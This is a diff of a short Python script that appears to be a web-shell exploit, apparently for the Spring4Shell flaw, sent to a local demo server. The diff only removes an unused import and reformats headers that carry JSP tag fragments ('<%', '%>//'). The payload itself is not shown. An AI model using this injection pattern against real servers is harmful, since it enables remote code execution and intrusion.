@@ -1,5 +1,4 @@
 import time
-import urllib.parse
 
 import requests
 
@@ -14,10 +13,7 @@ payload = {
 if __name__ == "__main__":
     go = requests.post(
         "http://localhost:8080/demo/index",
-        headers={
-            "suffix": "%>//",
-            "c2": "<%"
-        },
+        headers={"suffix": "%>//", "c2": "<%"},
         data=payload,
         timeout=15,
         allow_redirects=False,
